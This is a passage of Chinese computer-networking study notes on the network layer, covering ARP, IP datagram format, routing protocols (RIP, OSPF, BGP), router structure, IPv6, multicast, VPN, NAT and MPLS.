用转发器或网桥连接起来的若干个局域网仍为一个网络,因此这些局域网都具有同样的网络号net-id. IP地址与硬件地址 IP地址与硬件地址是不同的地址,从层次的角度看:硬件地址(或物理地址)是数据链路层和物理层使用的地址,IP地址是网络层和以上各层使用的地址,是一种用软件实现的逻辑地址. 地址解析协议ARP ARP作用:由网络层使用的IP地址解析出在数据链路层使用的硬件地址.每一个主机都设有一个ARP高速缓存,里面有所在的局域网上的各主机和路由器的IP地址到硬件地址的映射表. 当主机A欲向本局域网上的某个主机B发送IP数据报时,先在ARP高速缓存中查看有无主机B的IP地址,有就将其对应的硬件地址写入MAC帧,然后通过局域网将该MAC帧发往此硬件地址.没有的话ARP进程会在本局域网上广播发送一个ARP请求分组.收到ARP响应分组后,将得到的IP地址到硬件地址的映射写入ARP高速缓存.从IP地址到硬件地址的解析是ARP进程自动进行的. ARP请求分组:包含发送方硬件地址,发送方IP地址,目标方硬件地址(未知时填0),目标方IP地址. ARP响应分组:包含发送方硬件地址,发送方IP地址,目标方硬件地址,目标方IP地址. ARP分组封装在物理网络的帧中传输.本地广播ARP请求(路由器不转发ARP请求),如果所要找的主机和源主机不在同一个局域网上,那么就要通过ARP找到一个位于本局域网上的某个路由器的硬件地址,然后把分组发送给这个路由器,让这个路由器把分组转发给下一个网络.剩下的工作就由下一个网络来做. IP数据报的格式 IP数据报由首部和数据两部分组成.首部的前一部分是固定长度,共20字节,是所有IP数据报必须具有的.后面是一些可选字段,其长度是可变的. 版本占4bit,IPv4版本号为4. 首部长度占4bit,最大数值为15个单位,一个单位表示4byte,因此IP数据包的首部长度最大为60byte. 区分服务占8bit,旧标准叫做服务类型,但一直没被使用,1998年改为区分服务,只有在使用区分服务时该字段才起作用. 总长度占16bit,指首部与数据之和的长度,单位为字节,因此数据包最大长度为65535字节,且总长度不能超过MTU. 标识占16bit,是一个计数器,用来产生IP数据包的标识. 标志占3bit,目前只有前两位有意义.标志字段的最低位是MF,MF=1表示后面还有分片,MF=0表示这是最后一个分片.中间位是DF,DF=0才允许分片. 片偏移占13bit,指该分片在原分组中的相对位置,以8byte为偏移单位. 生存时间占8bit,记为TTL,指示数据报在网络中可通过的路由器数的最大值. 协议占8bit,指出该数据报的数据使用的协议类型,以便目的主机的IP层将数据部分向上传递.IP协议支持多种协议,可以封装多种协议的PDU,例如:ICMP,IGMP,TCP,UDP,OSPF. 首部检验和16bit,只检验数据报的首部,采用的是16bit二进制反码求和算法. 源地址和目的地址各占32bit. 可变部分用于支持排错,测量以及安全等措施,最长40个字节,会被填充对齐到4byte. IP层转发的流程 路由器按主机所在的网络地址来制作路由表.根据目的网络地址就能确定下一跳路由器,IP数据报最终一定可以找到目的主机所在目的网络上的路由器(可能要通过多次的间接交付),只有到达最后一个路由器时才试图向目的主机进行直接交付. 虽然互联网所有的分组转发都是基于目的主机所在的网络,但在大多数情况下都允许有这样的特例,即为特定的目的主机指明一个路由.采用特定主机路由可使网络管理人员能更方便地控制网络和测试网络,同时也可在需要考虑某种安全问题时采用这种特定主机路由. 路由器还可采用默认路由以减少路由表所占用的空间和搜索路由表所用的时间,这种转发方式在一个网络只有很少的对外连接时是很有用的.默认路由在主机发送IP数据报时往往更有优势,如果一个主机连接在一个小网络上,而这个网络只用一个路由器和互联网连接,那么在这种情况下使用默认路由是非常合适的. 当路由器收到待转发的数据报,将下一跳路由器的IP地址送交下层的网络接口软件,网络接口软件使用ARP将下一跳路由器的IP地址转换成硬件地址并将此硬件地址放在链路层的MAC帧的首部,然后根据硬件地址找到下一跳路由器. 路由器分组转发算法 从数据报的首部提取目的主机的IP地址D,得出目的网络地址为N. 若网络N与此路由器直接相连,则把数据报直接交付目的主机D;否则下一步. 若路由表中有目的地址为D的特定主机路由,则把数据报传送给路由表中所指明的下一跳路由器;否则下一步. 若路由表中有到达网络N的路由,则把数据报传送给路由表指明的下一跳路由器;否则下一步. 若路由表中有一个默认路由,则把数据报传送给路由表中所指明的默认路由器;否则报告转发分组出错. 划分子网和构造超网 划分子网 从1985年起在IP地址中又增加了一个子网号字段,使两级的IP地址变成为三级的IP地址.这种做法叫做划分子网,已成为互联网的正式标准协议.划分子网纯属一个单位内部的事情,单位对外仍然表现为没有划分子网的网络.从主机号借用若干个位作为子网号subnet-id,而主机号host-id也就相应减少了若干个位. 凡是从其他网络发送给本单位某个主机的IP数据报,仍然是根据IP数据报的目的网络号net-id,先找到连接在本单位网络上的路由器,然后此路由器在收到IP数据报后,再按目的网络号和子网号找到目的子网.最后将IP数据报直接交付目的主机. 子网掩码长度为32位,左边部分的一连串1对应网络号和子网号,右边部分的一连串0对应主机号.通过IP地址与子网掩码进行&amp;运算获得网络地址(包括网络号和子网号). 子网掩码是一个网络或一个子网的重要属性,路由器在和相邻路由器交换路由信息时,必须把自己所在网络(或子网)的子网掩码告诉相邻路由器.路由器的路由表中的每一个项目,除了要给出目的网络地址外,还必须同时给出该网络的子网掩码.若一个路由器连接在两个子网上,就拥有两个网络地址和两个子网掩码. 有固定长度子网和变长子网两种子网划分方法.在采用固定长度子网时,所划分的所有子网的子网掩码都是相同的.划分子网增加了灵活性,但却减少了能够连接在网络上的主机总数. 根据已成为互联网标准协议的RFC 950文档,子网号不能为全1或全0,但随着无分类域间路由选择CIDR的广泛使用,现在全1和全0的子网号也可以使用了,但一定要谨慎使用,确认路由器所用的路由选择软件是否支持全0或全1的子网号用法. 使用子网时分组的转发 在划分子网的情况下,从IP地址却不能唯一地得出网络地址来,因此分组转发的算法也必须做相应的改动. 从收到的分组的首部提取目的IP地址D. 先用连接的各网络的子网掩码和D逐位相与,看是否和相应的网络地址匹配.若匹配,则将分组直接交付;否则下一步. 若路由表中有目的地址为D的特定主机路由,则将分组传送给指明的下一跳路由器;否则下一步. 对路由表中的每一行,将子网掩码和D逐位相与.若结果与该行的目的网络地址匹配,则将分组传送给该行指明的下一跳路由器;否则下一步. 若路由表中有一个默认路由,则将分组传送给路由表中所指明的默认路由器;否则报告转发分组出错. 无分类编址CIDR(构造超网) 使用变长子网掩码VLSM可进一步提高IP地址资源的利用率,在VLSM的基础上又进一步研究出无分类编址方法,正式名字是无分类域间路由选择CIDR. CIDR消除了传统的A类,B类和C类地址以及划分子网的概念,使用各种长度的网络前缀来代替分类地址中的网络号和子网号.CIDR使用斜线记法,在IP地址面加上一个斜线/,然后写上网络前缀所占的位数.例如:220.78.168.0/24.CIDR把网络前缀都相同的连续的IP地址组成CIDR地址块,全1或全0的主机号地址一般不使用. 一个CIDR地址块可以表示很多地址,这种地址的聚合常称为路由聚合,路由聚合也称为构成超网.CIDR虽然不使用子网了,但仍然使用掩码(不叫子网掩码),/20的掩码是20个连续的1,斜线记法中的数字就是掩码中1的个数. 网络前缀的后面加一个星号*的表示方法,如0000101000*,在星号之前是网络前缀,而星号表示IP地址中的主机号,可以是任意值.前缀长度不超过23位的CIDR地址块都包含了多个C类地址,这些C类地址合起来就构成了超网. 使用CIDR时,路由表中的每个项目由网络前缀和下一跳地址组成,在查找路由表时可能会得到不止一个匹配结果.应当从匹配结果中选择具有最长网络前缀的路由,即最长前缀匹配.网络前缀越长,其地址块就越小,因而路由就越具体.最长前缀匹配又称为最长匹配或最佳匹配. IP地址的获取与配置 由系统管理员在文件中硬编码或者通过动态主机配置协议DHCP动态地从服务器得到IP地址. 当路由表的项目数很大时,为了进行更加有效的查找,通常将无分类编址的路由表存放在一种层次的数据结构中,然后自上而下地按层次进行查找.最常用的就是二叉线索.IP地址中从左到右的比特值决定了从根结点逐层向下层延伸的路径,而二叉线索中的各个路径就代表路由表中存放的各个地址.为了提高二叉线索的查找速度,广泛使用了各种压缩技术. 网际控制报文协议ICMP ICMP是互联网的标准协议,允许主机或路由器报告差错情况和提供有关异常情况的报告.ICMP不是高层协议,而是网络层的协议.但是ICMP报文是装在IP数据报中,作为其中的数据部分. ICMP报文的种类有两种,即ICMP差错报告报文和ICMP询问报文. ICMP差错报告报文的类型:终点不可达,时间超过,参数问题,改变路由(重定向).对ICMP差错报告报文不再发送ICMP差错报告报文,对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文,对具有多播地址的数据报都不发送ICMP差错报告报文,对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文. ICMP询问报文的类型:回送请求和回答报文,时间戳请求和回答报文.以下几种ICMP报文不再使用:信息请求与回答报文,掩码地址请求和回答报文,路由器询间和通告报文,源点抑制报文. PING工具使用ICMP回送请求与回送回答报文实现,traceroute/tracert用来跟踪一个分组从源点到终点的路径,它利用IP数据报中的TTL字段和ICMP时间超过差错报告报文实现对从源点到终点的路径的跟踪. 互联网的路由选择协议 有关路由选择的几个基本概念 路由选择是是网络中的所有结点共同协调工作的结果,且路由选择的环境往往是不断变化的,而这种变化有时无法事先知道.从路由算法的自适应性考虑可分为静态路由选择策略(非自适应路由选择)和动态路由选择策略(自适应路由选择). 互联网采用分层次的路由选择协议,通过自治系统AS减小处理粒度.自治系统AS指在单一的技术管理下的一组路由器,这些路由器使用一种AS内部的路由选择协议和共同的度量以确定分组在该AS内的路由,同时还使用一种AS之间的路由选择协议用以确定分组在AS之间的路由.一个AS对其他AS表现出的是一个单一的和一致的路由选择策略. 互联网有两大类路由选择协议:内部网关协议IGP,用于AS内部的路由信息传递(域内路由选择),如RIP和OSPF协议;外部网关协议EGP,用于不同AS之间路由信息的传递(域间路由选择),目前使用最多的是BGP-4. 内部网关协议RIP RIP是一种分布式的,基于距离向量的路由选择协议.RIP协议要求网络中的每一个路由器都要维护从它自己到其他每一个目的网络的距离记录. 从一个路由器到直接连接的网络的距离定义为1,从一个路由器到非直接连接的网络的距离定义为所经过的路由器数加1,RIP协议中的距离也称为跳数,这里的距离指的是"最短距离".RIP认为一个好的路由就是它通过的路由器的数目少,即距离短.RIP允许一条路径最多只能包含15个路由器,距离的最大值为16时即相当于不可达.RIP不能在两个网络之间同时使用多条路由,RIP选择一个具有最少路由器的路由,即最短路由,而不是最快路由. RIP协议的三个特点:仅和相邻路由器交换信息;交换的信息是当前本路由器所知道的全部信息,即自己的路由表;按固定的时间间隔交换路由信息,或者当网络拓扑发生变化时,路由器也及时向相邻路由器通告拓扑变化后的路由信息. 路由器在刚刚开始工作时,只知道到直接连接的网络的距离(为1),路由表是空的.以后,每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息,经过若干次更新后,所有的路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址.这个过程称为RIP协议的收敛过程,是较快的. 距离向量算法的基础就是Bellman-Ford算法.要点:X是结点A到B的最短路径上的一个结点,A-&gt;X和X-&gt;B也都分别是结点A到X和结点X到B的最短路径. 路由器收到相邻路由器(其地址为X)的一个RIP报文,先修改此RIP报文中的所有顶目:把下一跳字段中的地址都改为X,并把所有的距离字段的值加1. 对修改后的RIP报文中的每一个顶目重复:若项目中的目的网络不在路由表中,则把该项目加到路由表中;若下一跳字段给出的路由器地址是同样的,则把收到的顶目替换原路由表中的顶目;若收到项目中的距离小于路由表中的距离,则进行更新;否则什么也不做. 若3分钟还没有收到相邻路由器的更新路由表,则把此相邻路由器记为不可达路由器,即将距离置为16. RIP协议让互联网中的所有路由器都和自己的相邻路由器不断交换路由信息(30秒一次),并不断更新其路由表,使得从每一个路由器到每一个目的网络的路由都是最短的. RIP2协议的报文格式.RIP2报文由首部和路由部分组成,路由部分由若干个路由信息组成.每个路由信息需要用20个字节,地址族标识符(又称为地址类别)字段用来标志所使用的地址协议.路由标记填入自治系统的号码,再后面指出某个网络地址,该网络的子网掩码,下一跳路由器地址以及到此网络的距离.一个RIP报文最多可包括25个路由,因而RIP报文的最大长度是504字节. RIP2具有简单的鉴别功能:将原来写入第一个路由信息(20个字节)的位置用作鉴别,这时最多只能再放入24个路由信息. RIP协议特点:好消息传播得快,坏消息传播得慢.当网络出现故障时要经过比较长的时间(例如数分钟)才能将此信息传送到所有的路由器. 内部网关协议OSPF 开放最短路径优先OSPF,使用了Dijkstra提出的最短路径算法SPF,采用分布式的链路状态协议. OSPF使用洪泛法向本自治系统中所有路由器发送信息,发送的信息就是与本路由器相邻的所有路由器的链路状态,但这只是路由器所知道的部分信息.链路状态就是说明本路由器都和哪些路由器相邻,以及该链路的度量.只有当链路状态发生变化时,路由器才用洪泛法向所有路由器发送此信息.所有的路由器最终都能建立一个链路状态数据库.这个数据库实际上就是全网的拓扑结构图,它在全网范围内是一致的(这称为链路状态数据库的同步).OSPF的链路状态数据库能较快地进行更新,使各个路由器能及时更新其路由表.OSPF的更新过程收敛得快是其重要优点. 为了使OSPF能够用于规模很大的网络,OSPF将一个自治系统再划分为若干个更小的范围,叫做区域.每一个区域都有一个32位的区域标识符(用点分十进制表示).区域也不能太大,在一个区域内的路由器最好不超过200个.在一个区域内部的路由器只知道本区域的完整网络拓扑,而不知道其他区域的网络拓扑的情况. OSPF使用层次结构的区域划分,在上层的区域叫做主干区域/骨干区域,标识符规定为0.0.0.0.作用是用来连通其他在下层的区域.OSPF不用UDP而是直接用IP数据报传送,所以构成的数据报很短,从而减少路由信息的通信量,也可以不必将长的数据报分片传送,分片传送的数据报只要丢失一个,就无法组装成原来的数据报,整个数据报必须重传. OSPF对不同的链路可根据IP分组的不同服务类型TOS而设置成不同的代价.因此,OSPF对于不同类型的业务可计算出不同的路由.如果到同一个目的网络有多条相同代价的路径,那么可以将通信量分配给这几条路径,这叫做多路径间的负载平衡. 所有在OSPF路由器之间交换的分组都具有鉴别的功能,OSPF支持可变长度的子网划分和无分类编址CIDR.每一个链路状态都带上一个32位的序号,序号越大状态就越新. OSPF有五种分组类型:问候(Hello)分组,数据库描述分组,链路状态请求分组,链路状态更新分组,链路状态确认分组. OSPF规定每隔一段时间,如30分钟,要刷新一次数据库中的链路状态.由于一个路由器的链路状态只涉及到与相邻路由器的连通状态,因而与整个互联网的规模并无直接关系.OSPF没有坏消息传播得慢的问题.多点接入的局域网采用了指定的路由器的方法,使广播的信息量大大减少.指定的路由器代表该局域网上所有的链路向连接到该网络上的各路由器发送状态信息. 外部网关协议BGP BGP是不同自治系统的路由器之间交换路由信息的协议,对于自治系统之间的路由选择,要寻找最佳路由是很不现实的.当一条路径通过几个不同AS时,要想对这样的路径计算出有意义的代价是不太可能的.比较合理的做法是在AS之间交换可达性信息.自治系统之间的路由选择必须考虑有关策略,BGP只是寻找一条能够到达目的网络且比较好的路由(不能兜圈子). 每一个自治系统的管理员要选择至少一个路由器作为该自治系统的BGP发言人,一般说来,两个BGP发言人都是通过共享网络连接在一起的.而BGP发言人往往就是BGP边界路由器,但也可以不是.一个BGP发言人与其他自治系统中的BGP发言人要交换路由信息,就要先建立TCP连接,然后在此连接上交换BGP报文以建立BGP会话,利用BGP会话交换路由信息,两者彼此成为对方的邻站或对等站. BGP所交换的网络可达性的信息就是要到达某个网络所要经过的一系列AS,BGP协议交换路由信息的结点数量级是自治系统数的量级,这要比这些自治系统中的网络数少很多.每一个自治系统中BGP发言人的数目是很少的.这样就使得自治系统之间的路由选择不致过分复杂. BGP支持CIDR,因此BGP的路由表也就应当包括目的网络前缀,下一跳路由器,以及到达该目的网络所要经过的各个自治系统序列.在BGP刚刚运行时,BGP的邻站是交换整个的BGP路由表.但以后只需要在发生变化时更新有变化的部分. BGP-4的报文类型. 打开(OPEN)报文,用来与相邻的另一个BGP发言人建立关系. 更新(UPDATE)报文,用来发送某一路由的信息,以及列出要撤消的多条路由. 保活(KEEPALIVE)报文,用来确认打开报文和周期性地证实邻站关系. 通知(NOTIFICATION)报文,用来发送检测到的差错. 路由器的构成 路由器是一种典型的网络层设备,是一种具有多个输入端口和多个输出端口的专用计算机,其任务是将某个输入端口收到的分组,按照分组要去的目的地,把该分组从某个合适的输出端口转发给下一跳路由器.所以路由器的主要作用是:连通不同的网络,选择信息传送的线路,转发分组.这正是网络层的主要工作. 整个的路由器结构可划分路由选择部分和分组转发部分.路由选择部分也叫做控制部分,其核心构件是路由选择处理机,其任务是根据所选定的路由选择协议构造出路由表,同时经常或定期地和相邻路由器交换路由信息而不断地更新和维护路由表.分组转发部分由三部分组成:交换结构(根据转发表对分组进行处理),一组输入端口和一组输出端口. 转发就是路由器根据转发表将用户的IP数据报从合适的端口转发出去;路由选择则是按照分布式算法,根据从各相邻路由器得到的关于网络拓扑的变化情况,动态地改变所选择的路由.路由表是根据路由选择算法得出的,而转发表是从路由表得出的. 输入端口里面装有物理层,数据链路层和网络层的处理模块.数据链路层剥去帧首部和尾部后,将分组送到网络层的队列中排队等待处理,这会产生一定的时延.输入端口中的查找和转发功能在路由器的交换功能中是最重要的. 输出端口里有物理层,数据链路层和网络层的处理模块.输出端口从交换结构接收分组,然后把它们发送到路由器外面的线路上.在网络层的处理模块中设有一个缓冲区,当交换结构传送过来的分组的速率超过输出链路的发送速率时,来不及发送的分组就必须暂时存放在这个队列中.数据链路层处理模块将分组加上链路层的首部和尾部,交给物理层后发送到外部线路. 若路由器处理分组的速率赶不上分组进入队列的速率,则队列的存储空间最终必定减少到零,这就使后面再进入队列的分组由于没有存储空间而只能被丢弃.路由器中的输入或输出队列产生溢出是造成分组丢失的重要原因. 交换结构是路由器的关键构件,交换结构把分组从一个输入端口转移到某个合适的输出端口.常用交换方法有三种:通过存储器,通过总线,通过纵横交换结构. 通过存储器:输入端口收到一个分组时就用中断方式通知路由选择处理机,然后分组就从输入端口复制到存储器中,路由器处理机从分组首部提取目的地址,查找路由表,再将分组复制到合适的输出端口的缓存中,若存储器的带宽为每秒M个分组,那么路由器的交换速率(即分组从输入端口传送到输出端口的速率)一定小于M/2. 通过总线:数据报从输入端口通过共享的总线直接传送到合适的输出端口,因为每一个要转发的分组都要通过这一条总线,因此路由器的转发带宽就受总线速率的限制,现代的技术已经可以将总线的带宽提高到每秒吉比特的速率,因此许多的路由器产品都采用这种通过总线的交换方式. 通过纵横交换结构:这种交换结构常称为互连网络,它有2N条总线,可以使N个输入端口和N个输出端口相连接. IPv6 IPv6的基本首部 IPv6仍支持无连接的传送,但将协议数据单元PDU称为分组,IPv6所引进的主要变化:更大的地址空间(32位到128位),扩展的地址层次结构,灵活的首部格式,改进的选项,允许协议继续扩充,支持即插即用(不需要使用DHCP),支持资源的预分配,首部改为8字节对齐. IPv6数据报由两大部分组成:基本首部和有效载荷/净负荷. IPv6将首部长度变为固定的40字节,首部的字段数只有8个,IPv6对首部中的某些字段进行了如下的更改:取消了首部长度字段;取消了服务类型字段;取消了总长度字段,改用有效载荷长度字段;取消了协议字段,改用下一个首部字段;取消了检验和字段;取消了选项字段,而用扩展首部来实现选项功能;把TTL字段改称为跳数限制字段; 版本占4bit,IPv6为6;通信量类占8bit,用于区分不同IPv6数据报的类别或优先级;流标号占20bit,流是网络从特定源点到特定终点的一系列数据报,所有属于同一个流的数据报都有同样的流标号;有效载荷长度占16bit,它指明IPv6数据报除基本首部以外的字节数,其最大值为64KB;下一个首部占8bit,相当于IPv4的协议字段或可选字段用于指明扩展首部,默认为6,无扩展首部;跳数限制占8bit. IPv6将扩展首部留给路径两端的源站和目的站的主机来处理.数据报途中经过的路由器都不处理这些扩展首部(除了逐跳选项扩展首部).在RFC2460中定义了六种扩展首部:逐跳选项对应0;路由选择对应43;分片对应44;鉴别对应50;封装安全有效载荷对应51;目的站选项对应60;多个扩展首部通过前一个扩展首部的下一个首部指明,规则与上述一致.逐跳选项报头结构有一个扩展报头长度条目指明选项个数. IPv6的地址 IPv6数据报的目的地址可以是以下三种基本类型地址之一:单播,多播,任播(目的站是一组计算机,但数据报在交付时只交付其中的一个,通常是距离最近的一个). IPv6将实现IPv6的主机和路由器均称为结点,结点可能有多个与链路相连的接口,IPv6地址是分配给结点上面的接口的,一个接口可以有多个单播地址,任何一个地址都可以当作到达该结点的目的地址. IPv6使用冒号十六进制记法,如:68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF.冒号十六进制记法可以允许零压缩:FF05:0:0:0:0:0:0:B3可压缩为FF05::B3.在任一地址中只能使用一次零压缩.冒号十六进制记法可结合使用点分十进制记法的后缀:0:0:0:0:0:0:128.10.2.1.CIDR的斜线表示法仍然可用:12AB:OOOO:OOOO:CD30:0000:0000:0000:0000/60. 全球单播地址划分方法. 从IPv4向IPv6过渡 两种向IPv6过渡的策略:双协议栈;隧道技术.双协议栈是指在完全过渡到IPv6之前,使一部分主机或路由器装有两个协议栈,IPv4和IPv6,同时具有两种IP地址.隧道技术是指在IPv6数据报要进入IPv4网络时,把IPv6数据报封装成为IPv4数据报,整个的IPv6数据报变成了IPv4数据报的数据部分,离开IPv4网络中的隧道时再分离. ICMPv6 IPv6不保证数据报的可靠交付,也需要使用ICMP来反馈一些差错信息.新的版本称为ICMPv6.地址解析协议ARP和网际组管理协议IGMP协议的功能都已被合并到ICMPv6中.ICMPv6是面向报文的协议,它利用报文来报告差错,获取信息,探测邻站或管理多播通信.ICMPv6还增加了几个定义报文的功能及含义的其他协议. IP多播 IP多播目的是更好地支持一对多通信,即一个源点发送到许多个终点.应用场景:实时信息的交付,软件更新等.采用多播方式,只需发送一次到多播组,由路由器复制分组,局域网具有硬件多播功能,不需要复制分组.在互联网上进行多播就叫做IP多播,IP多播靠路由器来实现,能够运行多播协议的路由器称为多播路由器. IP多播所传送的分组需要使用多播IP地址,在多播数据报的目的地址写入的是多播组的标识符.多播组的标识符就是IP地址中的D类地址(多播地址).每一个D类地址标志一个多播组. 多播数据报和一般的IP数据报的区别就是它使用D类IP地址作为目的地址,并且首部中的协议字段值是2,表明使用网际组管理协议IGMP.多播数据报也是尽最大努力交付,不保证一定能够交付多播组内的所有成员.对多播数据报不产生ICMP差错报文. 互联网号码指派管理局IANA拥有的以太网地址块的高24位为00-00-SE.因此TCP/IP协议使用的以太网地址块的范围是:00-00-5E-00-00-00到00-00-5E-FF-FF-FF.在每一个地址中,只有23位可用作多播.D类IP地址可供分配的有28位,在这28位中的前5位不能用来构成以太网硬件地址.由于多播IP地址与以太网硬件地址的映射关系不是唯一的,因此收到多播数据报的主机,还要在IP层利用软件进行过滤,把不是本主机要接收的数据报丢弃. 多播需要的两种协议:为了使路由器知道多播组成员的信息,需要使用网际组管理协议IGMP.连接在局域网上的多播路由器还必须和互联网上的其他多播路由器协同工作,以便把多播数据报用最小代价传送给所有的组成员,需要使用多播路由选择协议. IGMP 和ICMP相似,IGMP使用IP数据报传递其报文,但它也向IP提供服务.不把IGMP看成是一个单独的协议,而是属于整个网际协议IP的一个组成部分. 加入多播组:当某个主机加入新的多播组时,该主机应向多播组的多播地址发送IGMP报文.本地的多播路由器收到IGMP报文后,将组成员关系转发给互联网上的其他多播路由器. 探询组成员变化情况:本地多播路由器要周期性地探询本地局域网上的主机,以便知道这些主机是否还继续是组的成员.只要对某个组有一个主机响应,播路由器就认为这个组是活跃的.一个组在经过几次的探询后仍然没有一个主机响应,则不再将该组的成员关系转发给其他的多播路由器. 在主机和多播路由器之间的所有通信都是使用IP多播,多播路由器在探询组成员关系时,只需要对所有的组发送一个请求信息的询问报文,默认的询问速率是每125秒发送一次.在IGMP的询问报文中有一个数值N,它指明一个最长响应时间,默认值为10秒,当收到询问时,主机在0到N之间随机选择发送响应所需经过的时延.对应最小时延的响应最先发送.同一个组内的每一个主机都要监听响应,只要有本组的其他主机先发送了响应,自己就可以不再发送响应了. 多播路由选择 多播路由选择协议尚未标准化.一个多播组中的成员是动态变化的,多播路由选择实际上就是要找出以源主机为根结点的多播转发树,在多播转发树上的路由器不会收到重复的多播数据报,对不同的多播组对应于不同的多播转发树,同一个多播组,对不同的源点也会有不同的多播转发树. 多播路由选择协议在转发多播数据报时使用三种方法. 洪泛与剪除,初始路由器转发多播数据报使用洪泛的方法,采用反向路径广播RPB避免兜圈子. 隧道技术,之前提到过,即对于不支持多播的网络会将多播数据报封装. 基于核心的发现技术,对每一个多播组G指定一个核心路由器,给出它的IP单播地址.核心路由器按照前面讲过的方法创建出对应于多播组G的转发树. RPB的要点. 路由器收到多播数据报时,先检查它是否是从源点经最短路径传送来的.是就向所有其他方向转发刚才收到的多播数据报,否则就丢弃. 如果存在几条同样长度的最短路径,那么只能选择一条最短路径,选择的准则就是看这几条最短路径中的相邻路由器谁的IP地址最小. 最后就得出了用来转发多播数据报的多播转发树,以后就按这个多播转发树转发. 如果在多播转发树上的某个路由器发现它的下游树枝已没有该多播组的成员,就应把它和下游的树枝一起剪除. 当某个树枝有新增加的组成员时,可以再接入到多播转发树上. 几种多播路由选择协议:距离向量多播路由选择协议DVMRP,基于核心的转发树CBT,开放最短通路优先的多播扩展MOSPF,协议无关多播-稀疏方式PIM-SM,协议无关多播-密集方式PIM-DM. 虚拟专用网VPN 本地地址指仅在机构内部使用的IP地址,可以由本机构自行分配,而不需要向互联网的管理机构申请.全球地址,全球唯一的IP地址,必须向互联网的管理机构申请.RFC 1918指明了一些专用地址,专用地址只能用作本地地址而不能用作全球地址.在互联网中的所有路由器,对目的地址是专用地址的数据报一律不进行转发. 采用这样的专用IP地址的互连网络称为专用互联网或本地互联网,或专用网.因为这些专用地址仅在本机构内部使用,专用IP地址也叫做可重用地址. 使用隧道技术实现利用公用的互联网作为本机构各专用网之间的通信载体,这样的专用网又称为虚拟专用网VPN,专用网是因为这种网络是为本机构的主机用于机构内部的通信,而不是用于和网络外非本机构的主机通信.VPN没有真正使用通信专线,只是在效果上和真正的专用网一样.如果VPN有保密的要求,那么其所有通过互联网传送的数据都会加密. 一个机构要构建自己的VPN就必须为它的每一个场所购买专门的硬件和软件,并进行配置,使每一个场所的VPN系统都知道其他场所的地址.由部门A和B的内部网络所构成的虚拟专用网VPN又称为内联网(intranet).一个机构和某些外部机构共同建立的虚拟专用网VPN又称为外联网(extranet). 网络地址转换NAT 在专用网上使用专用地址的主机如何与互联网上的主机通信(不需要加密).解决方法:再申请一些全球IP地址;采用网络地址转换NAT. 网络地址转换NAT需要在专用网连接到互联网的路由器上安装NAT软件.装有NAT软件的路由器叫做NAT路由器,它至少有一个有效的外部全球IP地址. 所有使用本地地址的主机在和外界通信时,都要在NAT路由器上将其本地地址转换成全球IP地址,才能和互联网连接.内部主机A用本地地址IPA和互联网上主机B通信所发送的数据报必须经过NAT路由器.NAT路由器将数据报的源地址IPA转换成全球地址IPG,并把转换结果记录到NAT地址转换表中,目的地址IPB保持不变,然后发送到互联网.NAT路由器收到主机B发回的数据报时,知道数据报中的源地址是IPB而目的地址是IPG.根据NAT转换表,NAT路由器将目的地址IPG转换为IPA,转发给最终的内部主机A. 当NAT路由器具有n个全球IP地址时,专用网内最多可以同时有n台主机接入到互联网.通过NAT路由器的通信必须由专用网内的主机发起,专用网内部的主机不能充当服务器用,因为互联网上的客户无法请求专用网内的服务器提供服务. 为了更加有效地利用NAT路由器上的全球IP地址,现在常用的NAT转换表把运输层的端口号也利用上.这样就可以使多个拥有本地地址的主机,共用一个NAT路由器上的全球IP地址.使用端口号的NAT叫做网络地址与端口号转换NAPT.而不使用端口号的NAT就叫做传统的NAT.NAPT可用一个LAN侧地址支持60000并行连接。 多协议标记交换MPLS MPLS最初是为提高路由器转发速度而提出,多协议表示在MPLS的上层可以采用多种协议.标记是指每个分组被打上一个标记,根据该标记对分组进行转发. 为了实现交换,可以利用面向连接的概念,使每个分组携带一个叫做标记(label)的小整数.当分组到达交换机(即标记交换路由器)时,交换机读取分组的标记,并用标记值来检索分组转发表.MPLS并没有取代IP,而是作为一种IP增强技术,被广泛地应用在互联网中.通过在专网中采用固定长度标记达到改善IP路由器的转发速率的目的,对端系统透明. MPLS具有以下三个方面的特点:支持面向连接的服务质量;支持流量工程,平衡网络负载;有效地支持虚拟专用网VPN. MPLS的工作原理:在MPLS域的入口处,给每一个IP数据报打上固定长度标记,然后对打上标记的IP数据报用硬件进行转发.采用硬件技术对打上标记的IP数据报进行转发就称为标记交换.交换表示在转发时不再上升到第三层查找转发表,而是根据标记在第二层链路层用硬件进行转发.MPLS域是指该域中有许多彼此相邻的路由器,并且所有的路由器都是支持MPLS技术的标记交换路由器LSR.LSR同时具有标记交换和路由选择这两种功能,标记交换功能是为了快速转发,但在这之前LSR需要使用路由选择功能构造转发表. 基本工作过程. MPLS域中的各LSR使用专门的标记分配协议LDP交换报文,并找出标记交换路径LSP.各LSR根据这些路径构造出分组转发表. 分组进入到MPLS域时,MPLS入口结点把分组打上标记,并按照转发表将分组转发给下一个LSR.给IP数据报打标记的过程叫做分类. 一个标记仅仅在两个标记交换路由器LSR之间才有意义.分组每经过一个LSR,LSR就要:转发,更换新的标记,即把入标记更换成为出标记.这就叫做标记对换. 当分组离开MPLS域时,MPLS出口结点把分组的标记去除.再以后就按照一般分组的转发方法进行转发. 上述的这种由入口LSR确定进入MPLS域以后的转发路径称为显式路由选择. MPLS有个很重要的概念就是转发等价类FEC,转发等价类就是路由器按照同样方式对待(从同样接口转发到同样的下一跳地址,且具有同祥服务类别和同祥丢弃优先级等)的分组的集合.入口结点并不是给每一个分组指派一个不同的标记,而是将属于同样FEC的分组都指派同样的标记.FEC和标记是一一对应的关系.FEC用于负载平衡,也称为流量工程TE或通信量工程. MPLS并不要求下层的网络都使用面向连接的技术,下层的网络并不提供打标记的手段,而是使用一种封装技术,在把IP数据报封装成以太网帧之前,先插入一个MPLS首部. MPLS首部共包括四个字段:标记值;试验,目前保留用作试验;栈s:在有标记栈时使用;生存时间TTL,用来防止MPLS分组在MPLS域中兜圈子.在以太网中使用值是0x8847(单播)和0x8848(组播)来表示承载的是MPLS报文(0800是IP报文）,在PPP中增加了一种新的NCP:MPLSCP,使用0x8281来标识.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-computer-network-无线网络和移动网络]]></title>
